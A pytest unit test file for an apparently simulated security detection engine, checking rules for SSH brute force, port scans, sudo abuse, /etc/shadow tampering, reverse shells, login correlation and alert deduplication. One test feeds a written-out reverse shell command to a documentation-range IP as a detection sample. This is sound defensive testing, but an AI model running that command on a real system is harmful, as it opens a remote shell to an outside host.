"""
Unit tests for the detection engine, correlation logic, thresholds,
false positive avoidance, and alert deduplication.
"""

import os
import tempfile
import pytest
from datetime import datetime, timezone, timedelta

from database.db_manager import DatabaseManager
from simulator.event_generator import SecurityEventGenerator
from simulator.ssh_simulator import SSHSimulator
from simulator.network_simulator import NetworkSimulator
from simulator.system_simulator import SystemSimulator
from detection.engine import DetectionEngine
from detection.correlation import EventCorrelator


class TestDetection:

    def setup_method(self):
        self.temp_db_file = tempfile.NamedTemporaryFile(suffix=".db", delete=False)
        self.db = DatabaseManager(db_path=self.temp_db_file.name)
        self.engine = DetectionEngine(db_manager=self.db)
        self.correlator = EventCorrelator(db_manager=self.db)
        self.generator = SecurityEventGenerator()

    def teardown_method(self):
        self.temp_db_file.close()
        if os.path.exists(self.temp_db_file.name):
            os.unlink(self.temp_db_file.name)

    def test_ssh_bruteforce_positive(self):
        """RULE-001: 6 failed attempts within 120 seconds triggers High severity alert."""
        events = SSHSimulator.generate_brute_force(attempts=6, include_success=False)
        alerts = self.engine.detect_ssh_bruteforce(events)
        assert len(alerts) == 1
        alert = alerts[0]
        assert alert["rule_id"] == "RULE-001"
        assert alert["severity"] == "High"
        assert alert["source_ip"] == "198.51.100.45"
        assert len(alert["supporting_event_ids"]) >= 5
        assert alert["mitre_technique_id"] == "T1110"

    def test_ssh_bruteforce_negative_below_threshold(self):
        """RULE-001: 2 failed attempts should NOT trigger brute-force alert."""
        events = SSHSimulator.generate_brute_force(attempts=2, include_success=False)
        alerts = self.engine.detect_ssh_bruteforce(events)
        assert len(alerts) == 0

    def test_baseline_traffic_zero_false_positives(self):
        """Ensure normal background telemetry produces zero alerts across all detection rules."""
        baseline_events = self.generator.generate_baseline_events(count=60)
        alerts = self.engine.run_detection(baseline_events)
        assert len(alerts) == 0

    def test_port_scan_positive(self):
        """RULE-004: Probing >= 5 distinct ports within 60s triggers Medium severity alert."""
        events = NetworkSimulator.generate_port_scan()
        alerts = self.engine.detect_port_scan(events)
        assert len(alerts) == 1
        assert alerts[0]["rule_id"] == "RULE-004"
        assert alerts[0]["mitre_technique_id"] == "T1046"
        assert alerts[0]["source_ip"] == "203.0.113.88"

    def test_port_scan_negative_single_probe(self):
        """RULE-004: Only 2 probed ports should NOT trigger a port scan alert."""
        events = NetworkSimulator.generate_port_scan(ports=[80, 443])
        alerts = self.engine.detect_port_scan(events)
        assert len(alerts) == 0

    def test_sudo_abuse_positive(self):
        """RULE-005: Denied sudo attempt or shell spawning triggers High alert."""
        events = SystemSimulator.generate_privilege_escalation()
        alerts = self.engine.detect_sudo_abuse(events)
        assert len(alerts) >= 1
        assert any(a["rule_id"] == "RULE-005" for a in alerts)
        assert any(a["mitre_technique_id"] == "T1548.003" for a in alerts)

    def test_file_modification_positive(self):
        """RULE-006: Modification of /etc/shadow triggers Critical alert."""
        events = SystemSimulator.generate_file_modification(target_path="/etc/shadow")
        alerts = self.engine.detect_file_tampering(events)
        assert len(alerts) == 1
        assert alerts[0]["rule_id"] == "RULE-006"
        assert alerts[0]["severity"] == "Critical"
        assert alerts[0]["mitre_technique_id"] == "T1565.001"

    def test_suspicious_process_positive(self):
        """RULE-007: Reverse shell execution triggers High alert."""
        events = SystemSimulator.generate_suspicious_process(
            command_line="bash -i >& /dev/tcp/198.51.100.45/4444 0>&1"
        )
        alerts = self.engine.detect_suspicious_process(events)
        assert len(alerts) == 1
        assert alerts[0]["rule_id"] == "RULE-007"
        assert alerts[0]["mitre_technique_id"] == "T1059.004"

    def test_correlation_failed_then_successful_login(self):
        """RULE-002: Repeated failures followed by success triggers Critical correlation alert."""
        events = SSHSimulator.generate_brute_force(attempts=5, include_success=True)
        corr_alerts = self.correlator.correlate_failed_then_successful_login(events)
        assert len(corr_alerts) == 1
        alert = corr_alerts[0]
        assert alert["rule_id"] == "RULE-002"
        assert alert["severity"] == "Critical"
        assert alert["mitre_technique_id"] == "T1110.001"
        # Supporting event IDs must include failures AND the success event
        assert len(alert["supporting_event_ids"]) == 6

    def test_duplicate_alert_prevention(self):
        """Re-running detection on identical events must not create duplicate alerts in SQLite."""
        events = SSHSimulator.generate_brute_force(attempts=6, include_success=False)
        self.db.insert_events(events)

        # Run detection first time
        run1 = self.engine.run_detection(events)
        assert len(run1) == 1

        # Run detection second time
        run2 = self.engine.run_detection(events)
        assert len(run2) == 0

        # Verify only 1 alert in DB
        db_alerts = self.db.get_alerts()
        assert len(db_alerts) == 1
